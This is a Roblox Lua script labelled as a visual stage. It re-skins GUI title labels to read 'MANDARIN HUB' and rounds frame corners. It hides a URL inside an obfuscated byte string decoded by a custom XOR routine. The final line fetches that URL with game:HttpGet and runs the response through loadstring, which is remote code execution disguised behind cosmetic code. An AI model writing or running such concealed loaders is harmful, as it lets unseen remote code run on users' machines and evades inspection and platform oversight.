
--[[ STAGE 2: VISUAL CORE ]]
local P2QIooNij49em3YmN8="\249\193\196\030\018\237\233\233\231\174\173\169\171\161\191\138\133\135\191\143\211\110\131\154\101\140\147\123\117\112\097\074\068\099\115\129\075\088\065\046\085\035\062\077\043\032\061\053\050\013\030\009\050\087\018\021\025\233\035\224\252\229\203\243\247\205\222\202\027\192\175\174\217\169\173\161\169\182\179\142\203\137\131\139\218\144\146\153\100\102\099\107\118\097\079\073\118\065\072\088\065\095\146\039\089\034\099\127\078\051\048\008\004\012"local eHDNOAfiski3_785A0Qu_=238 local tqacy0rH6lYxUy=159 local m6WtKs5JxLKbixfibgq0c=1 local YUyOFXzXHOdOIuqVJqNLee=4 local oCH7kslgSEMb=19 local mNdRjnZh_0irgD=true local z6ZCW77pNE2e6ZM=bit32 and bit32.bxor if not z6ZCW77pNE2e6ZM then z6ZCW77pNE2e6ZM=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local O0XVT1WDxmESD4L7aGL6b={}for xiGOMsRD7a7av5LfPIS=1,#P2QIooNij49em3YmN8 do local P51lRYRxUfbJA=string.byte(P2QIooNij49em3YmN8,xiGOMsRD7a7av5LfPIS)local OwScEwGBuIyPyj82=(tqacy0rH6lYxUy+(xiGOMsRD7a7av5LfPIS*YUyOFXzXHOdOIuqVJqNLee)+oCH7kslgSEMb)%256 if m6WtKs5JxLKbixfibgq0c==0 then P51lRYRxUfbJA=(P51lRYRxUfbJA-OwScEwGBuIyPyj82)%256 O0XVT1WDxmESD4L7aGL6b[xiGOMsRD7a7av5LfPIS]=string.char(z6ZCW77pNE2e6ZM(P51lRYRxUfbJA,eHDNOAfiski3_785A0Qu_))else P51lRYRxUfbJA=z6ZCW77pNE2e6ZM(P51lRYRxUfbJA,eHDNOAfiski3_785A0Qu_)O0XVT1WDxmESD4L7aGL6b[xiGOMsRD7a7av5LfPIS]=string.char((P51lRYRxUfbJA-OwScEwGBuIyPyj82)%256)end end local mpXnDL2POAU_QOZd4=table.concat(O0XVT1WDxmESD4L7aGL6b)if mNdRjnZh_0irgD then mpXnDL2POAU_QOZd4=string.reverse(mpXnDL2POAU_QOZd4)end local mGbVka8gnPr1J7PRG=mpXnDL2POAU_QOZd4
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(mGbVka8gnPr1J7PRG))()
